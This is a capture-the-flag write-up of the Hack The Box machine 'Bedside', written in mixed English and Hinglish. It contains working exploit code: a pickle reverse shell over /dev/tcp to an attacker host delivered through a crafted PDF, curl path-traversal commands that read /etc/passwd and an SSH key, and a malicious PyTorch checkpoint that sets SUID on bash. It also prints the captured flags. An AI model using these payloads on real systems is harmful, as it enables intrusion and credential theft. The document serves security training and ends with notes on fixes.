# Bedside — HTB Writeup

**Difficulty:** Medium · **OS:** Linux · **IP:** `10.129.55.47` · **Domain:** `bedside.htb`
**Flags:** `user.txt` ✅ · `root.txt` ✅

## Attack Chain

```text
Vhost fuzz (research.bedside.htb)
  → CVE-2025-64512 pdfminer.six pickle RCE (upload sh.pickle.gz + trigger.pdf)
  → datawrangler shell (Docker container)
  → Path traversal on host service :3000 (curl --path-as-is)
  → developer SSH key + user.txt
  → sudo: /usr/bin/python3 /opt/trainer/bedside_trainer.py
  → malicious PyTorch .pt checkpoint (torch.load pickle) → chmod +s /bin/bash
  → root
```

## 1. Recon

- `nmap -p-`: **22** (OpenSSH), **80** (Apache), **3000** (filtered from outside — localhost/docker-gateway only)
- `ffuf -H "Host: FUZZ.bedside.htb"` → **research.bedside.htb**
- research = Python app, `X-Powered-By: pdfminer.six`, upload form `uploadFile`
- Upload rules: ext whitelist `jpeg jpg png bmp tiff dcm pdf gz zip`, MIME magic ↔ extension checked, filenames sanitized, `.php` blanket-403, `/uploads/` listing 403

## 2. Initial RCE — CVE-2025-64512 (pdfminer.six < 20251230)

`CMapDB._load_data()` does `pickle.loads()` on `<name>.pickle.gz`. An absolute path in the PDF font's `/Encoding` (`#2F`-escaped) loads our uploaded pickle.

Payload (stdlib version — ran inside Kali, no `requests` needed):

```python
import gzip, os, pickle, sys, uuid
from urllib.request import Request, urlopen

LHOST, LPORT = sys.argv[1], sys.argv[2]
UP = "/var/www/research.bedside.htb/uploads"
URL = "http://research.bedside.htb/"

class RCE:
    def __reduce__(self):
        cmd = f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &"
        return (os.system, (cmd,))

PDF = """%PDF-1.4
...5 0 obj<< /Type /Font /Subtype /Type0 /BaseFont /F
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fsh /DescendantFonts [6 0 R] >>endobj
...""".replace("__ENC__", (UP + "/sh").replace("/", "#2F"))
# 1) upload sh.pickle.gz  (gzip.compress(pickle.dumps(RCE())), application/gzip)
# 2) upload trigger.pdf
# watcher (pdf_watcher.py) runs pdf2txt.py every 30s → CMap load → RCE
```

Listener: target se callback `LHOST:4444` (container tun0 IP, e.g. `10.10.16.29`).
Kali image mein `nc` nahi tha → chhota Python TCP listener (log + FIFO stdin):

```python
srv = socket.socket(); srv.bind(("0.0.0.0", 4444)); srv.listen(1)
conn, addr = srv.accept()   # commands FIFO /tmp/f se bhejo, output /tmp/shell.log
```

```text
[+] shell from ('10.129.55.47', 59226)
datawrangler@data-wrangler:/app$
```

- `id` → `uid=988(datawrangler) gid=1001(dataops)` · no sudo binary
- Container (`.dockerenv` present), watcher = `/app/pdf_watcher.py` (root-owned, runs `pdf2txt.py` on `uploads/*.pdf` every 30s)
- No user.txt inside container (red herring — flag host par hai)

## 3. Pivot out of container — Path Traversal on :3000

Port **3000** host par chalta hai ("Bedside Clinic – Image Viewer"), container se gateway `172.17.0.1` par reachable. Static file server **path traversal** vulnerable — curl ka `--path-as-is` chahiye (warna curl `../` collapse kar deta hai):

```bash
# container shell (datawrangler) se:
curl -s --path-as-is http://172.17.0.1:3000/../../../../etc/passwd
curl -s --path-as-is http://172.17.0.1:3000/../../../../home/developer/user.txt
curl -s --path-as-is http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa
```

- **user.txt:** `055707cf5b8e4b7e7ffc2b49b2837c1d`
- `id_rsa` → save on Kali, `chmod 600`, SSH `developer@10.129.55.47`

## 4. Privesc #1 — sudo + PyTorch `torch.load` RCE

```text
developer@bedside$ sudo -l
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

`/opt/trainer/bedside_trainer.py` MONAI `CheckpointLoader` use karta hai → `torch.load(..., weights_only=False)` → **pickle deserialization**. `.pt` = ZIP with `archive/data.pkl`.

Malicious checkpoint builder (on Kali):

```python
import os, pickle, zipfile

class RCE:
    def __init__(self, cmd): self.cmd = cmd
    def __reduce__(self): return (os.system, (self.cmd,))

payload = pickle.dumps({"model": RCE("chmod +s /bin/bash")}, protocol=2)
with zipfile.ZipFile("/root/pt/checkpoint_epoch_99.pt", "w", zipfile.ZIP_STORED) as z:
    z.writestr("archive/data.pkl", payload)
    z.writestr("archive/version", "3\n")
```

Barriers + solutions:

| Barrier | Fix |
|---|---|
| Trainer ko `/datastore/processed/` mein image chahiye | datawrangler se `scan.png` (1×1 PNG, base64) drop kiya |
| Watcher `staging/*.txt` bharta rehta hai | FIFO shell mein background cleanup loop: `while true; do rm -f /datastore/staging/*.txt /datastore/processed/*.txt; sleep 0.3; done &` |
| `.pt` ko ZIP hona padta | builder upar wala (magic `50 4b 03 04`) |

Transfer: Kali par `python3 -m http.server 8000` → container se
`curl -o /datastore/checkpoints/checkpoint_epoch_99.pt http://<LHOST>:8000/checkpoint_epoch_99.pt`

```bash
developer@bedside$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
# TypeError: Expected state_dict ... (expected — pickle already fired)
developer@bedside$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1298416 May 9 12:07 /bin/bash
developer@bedside$ bash -p -c 'id; cat /root/root.txt'
uid=1000(developer) ... euid=0(root)
68e72776c9e2a1aec7da807831da081c
```

**root.txt:** `68e72776c9e2a1aec7da807831da081c`

## Notes / Gotchas

- Tunnel ke liye **sahi `.ovpn`** (`htb vpn download <server_id>`) — galat server (Arena) par machine sab `filtered` dikhta hai
- Mac se browse: chisel reverse `R:8080:<ip>:80` → `http://research.bedside.htb:8080` (hosts entry `127.0.0.1`)
- Uploads ke liye **asli gzip magic** chahiye (text ko `.gz` naam se server reject karta hai)
- CVE fix: pdfminer.six **20251230+**; torch unsafe load = `weights_only=True` karo
